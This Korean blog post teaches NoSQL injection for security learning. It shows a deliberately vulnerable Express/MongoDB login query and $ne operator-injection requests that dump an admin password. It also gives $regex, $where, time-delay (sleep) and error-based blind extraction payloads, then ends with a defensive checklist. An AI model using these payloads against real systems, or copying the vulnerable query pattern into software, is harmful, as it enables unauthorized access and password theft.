---
title: "[Infosec] NoSQL & Blind NoSQL Injection 정리 (MongoDB·Redis·CouchDB)"
date: 2025-09-10 20:30:00 +0900
categories: [보안, Web]   # 카테고리는 여러 계층도 가능 [상위, 하위]
tags: [웹해킹, NoSQL, MongoDB, Redis, CouchDB, NoSQLi, BlindNoSQLi,]          # 해시태그처럼 글 묶기
description: "NoSQL의 허점을 이용해라"
author: "송지민"
toc: true
---
# 새로운 환경에서도 여전히 강력한 주입 공격

---
> 이 글은 **보안 학습/방어 목적**입니다. 실습은 반드시 **자신의 로컬/테스트 환경**에서만 하세요.

## NoSQL(DBMS) 한눈 정리

## DBMS란?

DBMS(Database Management System)는 데이터베이스를 관리하며 **CRUD(Create, Read, Update, Delete)** 기능을 제공하고, 다수의 사용자가 동시에 접근할 수 있도록 해준다.

| 종류 | 대표 DBMS |
| --- | --- |
| 관계형(Relational) | MySQL, MariaDB, PostgreSQL, SQLite |
| 비관계형(Non-Relational) | MongoDB, CouchDB, Redis |

- **관계형**: 행과 열(테이블, 스프레드시트와 유사) 구조  
- **비관계형**: 주로 Key-Value, 문서, 그래프 등의 구조

---

# MongoDB

## 주요 연산자 (일부)

**Comparison**

| Name | Description |
| --- | --- |
| `$eq` | 지정한 값과 같은 값을 찾음 (equal) |
| `$in` | 배열 안의 값들 중 하나와 일치 |
| `$ne` | 지정한 값과 일치하지 않음 (not equal) |
| `$nin` | 배열 안의 값들과 일치하지 않음 (not in) |

**Logical**

| Name | Description |
| --- | --- |
| `$and` | 논리 AND — 모든 조건을 만족 |
| `$not` | 조건의 효과 반전 |
| `$nor` | 논리 NOR — 모든 조건을 만족하지 않는 문서 |
| `$or` | 논리 OR — 조건 중 하나 이상 만족 |

**Element**

| Name | Description |
| --- | --- |
| `$exists` | 지정된 필드가 존재하는 문서 |
| `$type` | 지정된 필드의 BSON 타입이 특정 타입인 문서 |

**Evaluation**

| Name | Description |
| --- | --- |
| `$expr` | 쿼리에서 집계식 사용 |
| `$regex` | 정규식과 일치 |
| `$text` | 텍스트 인덱스로 검색 |

> 표기 확인: `"$regex"` (오타 주의)

## 기본 쿼리 문법 예

**SELECT (find)**
```javascript
db.account.find(
  { user_id: "admin" },         // 조건
  { user_idx: 1, _id: 0 }       // 프로젝션
)
```

**INSERT**
```javascript
db.account.insertOne({ user_id: "guest", user_pw: "guest" })
```

**DELETE**
```javascript
db.account.deleteOne({ user_id: "guest" })
```

**UPDATE**
```javascript
db.account.updateOne(
  { user_idx: 2 },
  { $set: { user_id: "guest2" } }
)
```

---

# Redis

```text
$ redis-cli
127.0.0.1:6379> SET test 1234   # SET key value
OK
127.0.0.1:6379> GET test        # GET key
"1234"
```

**데이터 조회/조작**

| 명령어 | 구조 | 설명 |
| --- | --- | --- |
| `GET` | `GET key` | 데이터 조회 |
| `MGET` | `MGET key [key …]` | 여러 키 조회 |
| `SET` | `SET key value` | 데이터 추가 |
| `MSET` | `MSET key value [key value …]` | 여러 데이터 추가 |
| `DEL` | `DEL key [key …]` | 데이터 삭제 |
| `EXISTS` | `EXISTS key [key …]` | 존재 여부 |
| `INCR` | `INCR key` | 값 1 증가 |
| `DECR` | `DECR key` | 값 1 감소 |

**관리 명령어**

| 명령어 | 구조 | 설명 |
| --- | --- | --- |
| `INFO` | `INFO [section]` | 서버 정보 |
| `CONFIG GET` | `CONFIG GET parameter` | 설정 조회 |
| `CONFIG SET` | `CONFIG SET parameter value` | 설정 변경 |

---

# CouchDB

REST API 형태로 접근하는 문서 지향 DB.

```bash
# 문서 생성
curl -X PUT "http://{username}:{password}@localhost:5984/users/guest" \
     -H "Content-Type: application/json" \
     -d '{"upw":"guest"}'

# 문서 조회
curl "http://{username}:{password}@localhost:5984/users/guest"
```

### 특수 구성 요소

- `_` 로 시작하는 경로/필드는 **특수 리소스**

**SERVER**

| 요소 | 설명 |
| --- | --- |
| `/` | 인스턴스 메타 정보 |
| `/_all_dbs` | 데이터베이스 목록 |
| `/_utils` | Fauxton(관리자 UI) |

**Database**

| 요소 | 설명 |
| --- | --- |
| `/{db}` | 지정 DB 정보 |
| `/{db}/_all_docs` | 모든 문서 목록 |
| `/{db}/_find` | JSON 쿼리로 문서 검색 |

---

# NoSQL Injection

Express 예제로 **쿼리 파라미터가 객체/배열로 해석**될 수 있음을 확인:

```javascript
const express = require('express');
const app = express();
app.get('/', function(req, res) {
  console.log('data:', req.query.data);
  console.log('type:', typeof req.query.data);
  res.send('hello world');
});
app.listen(3000, () => console.log('app.listen'));
```

예시 요청과 타입

```text
GET /?data=1234
data: 1234
type: string

GET /?data[]=1234
data: [ '1234' ]
type: object

GET /?data[5678]=1234
data: { '5678': '1234' }
type: object
```

MongoDB 컬렉션에서 `uid`와 `upw`로 사용자를 찾는 코드:

```javascript
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });

app.get('/query', function(req, res) {
  db.collection('user').find({
    uid: req.query.uid,
    upw: req.query.upw
  }).toArray(function(err, result) {
    if (err) throw err;
    res.send(result);
  });
});

app.listen(3000, () => console.log('app.listen'));
```

연산자 주입 예 (`$ne`)
```text
GET /query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"...","uid":"admin","upw":"secretpassword"}]
```

> 쿼리 스트링이 **객체/연산자로 변환**되면서 의도치 않은 조건이 생성될 수 있다.

---

# Blind NoSQL Injection

자주 활용되는 연산자(개념)

| Name | Description |
| --- | --- |
| `$expr` | 집계식을 쿼리에서 사용 |
| `$regex` | 정규식 일치 |
| `$text` | 텍스트 검색 |
| `$where` | JavaScript 표현식 평가(주의) |

문자 시작 패턴으로 탐색(`$regex`)

```javascript
db.user.find({ upw: { $regex: "^g" } })
// { "_id": ObjectId("..."), "uid": "guest", "upw": "guest" }
```

JavaScript 평가 (`$where`)

```javascript
// 필드에는 적용 불가, 최상위에서만 사용 가능
db.user.find({ $where: "return 1==1" })
// OK
db.user.find({ uid: { $where: "return 1==1" } })
// Error: $where cannot be applied to a field
```

문자 단위 비교

```javascript
db.user.find({ $where: "this.upw.substring(0,1)=='g'" })
// 일치 시 결과 반환
```

지연 기반 판단(개념 예시)

```javascript
db.user.find({ $where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'` });
/*
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> 시간 지연 발생 (참일 때)
*/
```

에러 기반 판단(개념 예시)

```javascript
db.user.find({ $where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'" });
// 'asdf' 미정의 → 참 조건에서 에러 발생
```

---

## 방어 전략 (실무 체크리스트)

1. **입력 스키마 검증 & 타입 고정**  
   - Joi/Zod/express-validator 등으로 **uid, upw를 문자열로 강제**
   - 예상 밖의 객체/배열/연산자(`$ne`, `$where` 등) 거부

2. **연산자 화이트리스트/검증**  
   - 서버에서 허용 연산자만 통과 (예: `$eq` 만)

3. **MongoDB 보안 옵션**  
   - `$where`/서버사이드 JS 사용 지양 (가능하면 비활성화)  
   - 필요한 인덱스 설계로 `$regex` 전면 스캔 방지

4. **라이브러리 활용**  
   - `express-mongo-sanitize` 등으로 `req` 내 `$`/`.` 제거
   - Mongoose **Schema strict 모드** + `runValidators: true`

5. **일관된 에러/지연 처리**  
   - 상세 오류 메시지 숨김, 타이밍 차이 줄이기(레이트리밋/표준 응답)

6. **권한 분리/최소 권한**  
   - DB 사용자 권한 최소화, 운영/테스트 분리

---

## 요약

- **NoSQL**: 문서/Key‑Value 등 다양한 모델, 유연하지만 **입력 검증/모델링** 필수  
- **NoSQL Injection**: 객체/연산자 주입으로 의도치 않은 조건 실행 가능  
- **Blind NoSQLi**: 참/거짓·지연·에러 등 간접 신호로 정보 유출  
- **방어 핵심**: **스키마 검증 + 연산자 차단 + `$where` 지양 + 라이브러리 보호막**

